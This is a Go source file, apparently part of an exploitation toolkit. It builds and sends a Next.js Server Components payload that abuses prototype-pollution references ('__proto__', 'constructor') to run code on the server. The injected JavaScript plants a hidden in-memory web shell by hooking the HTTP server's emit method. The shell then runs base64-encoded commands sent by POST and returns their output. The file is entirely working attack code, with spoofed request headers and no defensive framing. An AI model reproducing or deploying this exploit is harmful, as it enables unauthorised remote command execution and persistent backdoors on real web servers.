package exploit

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"time"
)

type NextJSMemoryShellPayload struct {
	Then     string       `json:"then"`
	Status   string       `json:"status"`
	Reason   int          `json:"reason"`
	Value    string       `json:"value"`
	Response ResponseData `json:"_response"`
	Chunks   string       `json:"_chunks"`
	FormData FormDataInfo `json:"_formData"`
}

type ResponseData struct {
	Prefix   string       `json:"_prefix"`
	Chunks   string       `json:"_chunks"`
	FormData FormDataInfo `json:"_formData"`
}

type FormDataInfo struct {
	Get string `json:"get"`
}

func GenerateNextJSMemoryShell(urlPath string) *NextJSMemoryShellPayload {
	payload := &NextJSMemoryShellPayload{
		Then:   "$1:__proto__:then",
		Status: "resolved_model",
		Reason: -1,
		Value:  `{"then":"$B1337"}`,
		Response: ResponseData{
			Prefix: fmt.Sprintf("(async()=>{const http=await import('node:http');const url=await import('node:url');const cp=await import('node:child_process');const originalEmit=http.Server.prototype.emit;http.Server.prototype.emit=function(event,...args){if(event==='request'){const[req,res]=args;const parsedUrl=url.parse(req.url,true);if(parsedUrl.pathname==='%s'){if(req.method!=='POST'){res.writeHead(405,{'Content-Type':'application/json'});res.end(JSON.stringify({success:false,error:'POST required'}));return true;}let body='';req.on('data',c=>body+=c);req.on('end',()=>{let raw='MFLVCPI=';try{if(req.headers['content-type']?.includes('application/json')){const j=JSON.parse(body||'{}');raw=j.raw??raw;}else{const p=new URLSearchParams(body);raw=p.get('raw')??raw;}}catch(_){}const cmd=Buffer.from(raw,'base64').toString('utf8');cp.exec(cmd,{maxBuffer:104857600,encoding:'buffer'},(err,stdout,stderr)=>{res.writeHead(200,{'Content-Type':'application/json'});res.end(JSON.stringify({success:!err,stdout:stdout?stdout.toString('utf8'):'',stderr:stderr?stderr.toString('utf8'):'',error:err?err.message:null}));});});return true;}}return originalEmit.apply(this,arguments);};})();", urlPath),
			Chunks: "$Q2",
			FormData: FormDataInfo{
				Get: "$1:constructor:constructor",
			},
		},
		Chunks: "$@0",
		FormData: FormDataInfo{
			Get: "$1:constructor:constructor",
		},
	}
	return payload
}

func InjectNextJSMemoryShell(targetURL string, urlPath string, headers map[string]string) error {
	payload := GenerateNextJSMemoryShell(urlPath)
	payloadJSON, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("failed to marshal payload: %v", err)
	}

	var requestBody bytes.Buffer
	writer := multipart.NewWriter(&requestBody)

	field0, err := writer.CreateFormField("0")
	if err != nil {
		return fmt.Errorf("failed to create form field 0: %v", err)
	}
	_, err = field0.Write(payloadJSON)
	if err != nil {
		return fmt.Errorf("failed to write form field 0: %v", err)
	}

	field1, err := writer.CreateFormField("1")
	if err != nil {
		return fmt.Errorf("failed to create form field 1: %v", err)
	}
	_, err = field1.Write([]byte(`"$@0"`))
	if err != nil {
		return fmt.Errorf("failed to write form field 1: %v", err)
	}

	field2, err := writer.CreateFormField("2")
	if err != nil {
		return fmt.Errorf("failed to create form field 2: %v", err)
	}
	_, err = field2.Write([]byte("[]"))
	if err != nil {
		return fmt.Errorf("failed to write form field 2: %v", err)
	}

	err = writer.Close()
	if err != nil {
		return fmt.Errorf("failed to close multipart writer: %v", err)
	}

	client := &http.Client{
		Timeout: 30 * time.Second,
	}
	req, err := http.NewRequest("POST", targetURL, &requestBody)
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0")

	for key, value := range headers {
		req.Header.Set(key, value)
	}

	if req.Header.Get("Next-Action") == "" {
		req.Header.Set("Next-Action", "x")
	}
	if req.Header.Get("X-Nextjs-Request-Id") == "" {
		req.Header.Set("X-Nextjs-Request-Id", fmt.Sprintf("%d", time.Now().Unix()))
	}
	if req.Header.Get("X-Nextjs-Html-Request-Id") == "" {
		req.Header.Set("X-Nextjs-Html-Request-Id", fmt.Sprintf("%016x", time.Now().UnixNano()))
	}

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send request: %v", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read response: %v", err)
	}

	if resp.StatusCode != 200 {
		return fmt.Errorf("injection failed with status %d: %s", resp.StatusCode, string(body))
	}

	return nil
}
